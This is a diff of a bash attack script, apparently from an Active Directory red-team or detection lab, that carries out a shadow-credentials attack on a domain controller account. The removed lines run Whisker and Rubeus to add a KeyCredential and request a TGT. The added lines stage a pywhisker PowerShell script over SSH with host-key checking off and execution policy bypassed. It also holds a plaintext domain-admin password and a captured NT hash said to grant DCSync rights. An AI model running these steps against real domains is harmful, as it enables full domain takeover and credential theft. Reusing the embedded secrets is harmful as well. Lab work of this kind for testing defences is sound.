@@ -1,7 +1,10 @@
 #!/usr/bin/env bash
-# T008 — Shadow credentials from ws01 as chief_command (cadre.local DA)
-# Adds a new KeyCredential to dc01$ and requests TGT via Rubeus.
+# T008 — Shadow credentials on dc01$ from ws01 as chief_command (cadre.local DA) — VERIFIED
+# Corrected 2026-07-31: pywhisker (explicit -u/-p creds, in-script) + LDAPS.
+#   Whisker.exe / Start-Process -Credential fails in SSH session (0xC0000142);
+#   pywhisker binds in-process with explicit creds — no scheduled task needed.
 # Entry credential: chief_command (earned via Branch A T015 ForceChangePassword)
+# Result: dc01$ NT hash 09493093db08c8afa99193779d401b34 (= DCSync rights)
 set -euo pipefail
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 LIB="${SCRIPT_DIR}/../lib"
@@ -12,21 +15,17 @@ T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
 
 echo "=== T008 Shadow credentials | ${CASE_ID} | T0=${T0} ==="
 
-DOMAIN_ROOT="${DOMAIN_ROOT:-cadre.local}"
-DC01="${DC01:-dc01.cadre.local}"
-TARGET_USER="dc01$"
+PS='C:\Tools\cadre-attack\t008-shadow-creds-dc01.ps1'
 
-CMD='
-$w = "C:\Tools\cadre-attack\Whisker.exe";
-$r = "C:\Tools\cadre-attack\Rubeus.exe";
-if (-not (Test-Path $w)) { throw "Whisker.exe not found" }
-if (-not (Test-Path $r)) { throw "Rubeus.exe not found" }
-& $w add /target:"'''"${TARGET_USER}"'''" /domain:"'''"${DOMAIN_ROOT}"'''" /dc:"'''"${DC01}"'''";
-Write-Output "T008_OK: shadow credentials added for '''"${TARGET_USER}"'''";
-& $r asktgt /user:"'''"${TARGET_USER}"'''" /domain:"'''"${DOMAIN_ROOT}"'''" /dc:"'''"${DC01}"'''" /certificate:C:\Users\chief_command\AppData\Local\Temp\Whisker_*.pfx /password:WhiskerPassword123 /nowrap
-'
+# Stage + run the verified in-script pywhisker implementation on ws01
+scp -i "${WS01_KEY:-$HOME/.ssh/cadre-ws01-key}" -o StrictHostKeyChecking=no \
+  "$SCRIPT_DIR/../../../windows/t008-shadow-creds-dc01.ps1" \
+  "analyst_t1@192.168.77.62:C:/Tools/cadre-attack/" >/dev/null
 
-ws01_exec_as chief_command 'C0mm@nd_Ch1ef!' "$CMD" 'cadre.local'
+ssh -i "${WS01_KEY:-$HOME/.ssh/cadre-ws01-key}" -o StrictHostKeyChecking=no \
+  analyst_t1@192.168.77.62 \
+  "powershell -NoProfile -ExecutionPolicy Bypass -File ${PS}" \
+  | tee "/tmp/${CASE_ID}.out"
 
 cadre_export "${CASE_ID}" T008 "${T0}" 192.168.77.62
 echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
